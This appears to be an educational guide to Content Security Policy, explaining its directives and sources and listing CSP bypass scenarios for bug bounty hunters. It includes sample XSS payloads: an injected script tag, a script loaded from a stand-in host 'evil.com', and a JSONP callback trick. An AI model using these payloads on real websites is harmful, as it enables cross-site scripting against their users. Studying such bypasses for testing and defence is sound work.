CSP Guide

Content Security Policy

Complete CSP explanation, directives, sources, and bypass techniques.

What is CSP?

Imagine your website is a house. JavaScript, images, CSS, iframes are people entering the house.

Before CSP: Anyone can enter. If attacker injects <script>, browser runs it.

After CSP: You put a security guard at the door with a rule list:

"Only people from THESE places can enter. Everyone else → blocked"

That rule list = Content Security Policy

Who Enforces CSP?

❌ NOT the server
❌ NOT JavaScript
✅ The browser itself

Even if HTML injection exists, script tag exists, and payload is perfect — browser will refuse to run it if CSP says NO.

How CSP is Sent

Method 1: HTTP Header (STRONGEST)

Content-Security-Policy: script-src 'self'

Method 2: HTML Meta Tag (WEAKER)

<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

⚠️ Meta CSP cannot protect everything and can be overridden by headers.

CSP Directives

Directive Controls
script-src <script>, inline JS, onclick, eval()
default-src Fallback rule for all content types
img-src <img src=...>
style-src CSS files, inline <style>
frame-src <iframe src=...>
connect-src fetch, XMLHttpRequest, WebSocket
object-src <object>, <embed>, <applet>
base-uri <base href> — stops link rewriting
form-action Where forms can submit
frame-ancestors Who can embed THIS page (clickjacking)

CSP Sources

Source Meaning
'self' Same domain only
* Almost anywhere (dangerous)
'none' Nothing allowed
data: Base64 data (dangerous for JS)
'unsafe-inline' Allow inline JS (VERY BAD)
'unsafe-eval' Allow eval() (BAD)
nonce-xyz Only scripts with matching nonce
hash-abc Only scripts matching hash

Why Inline XSS Fails

You injected: "><script>alert(1)</script>

CSP: default-src 'self'

Where does it say inline scripts are blocked?

  • Inline scripts fall under script-src
  • script-src is not defined
  • Browser uses default-src
  • default-src = 'self'
  • Inline script ≠ self
  • ❌ Blocked

Key rule: If unsafe-inline is NOT present → inline JS is blocked. Always.

CSP Bypass Scenarios

Scenario 1: unsafe-inline Present

script-src 'self' 'unsafe-inline'

➡️ CSP defeated by misconfiguration

Scenario 2: Wildcard *

script-src *

Attacker can host: <script src="https://evil.com/x.js"></script>

Scenario 3: JSONP Endpoint

Whitelisted domain has JSONP:

<script src="https://google.com/api?callback=alert"></script>

Browser trusts Google → XSS runs.

Scenario 4: CDN with Old JS

Old Angular/Prototype versions have known XSS gadgets. CSP allows the vulnerable library.

Scenario 5: Open Redirect on Whitelisted Domain

Browser only checks host, not final payload logic.

Bug Bounty Reality

To report CSP-related XSS, you MUST show:

  • ✔ Script execution
  • ✔ User interaction not required (usually)
  • ✔ CSP misconfiguration
  • ✔ Real impact

❌ If you only have reflection, head injection, or meta injection — it will be rejected.
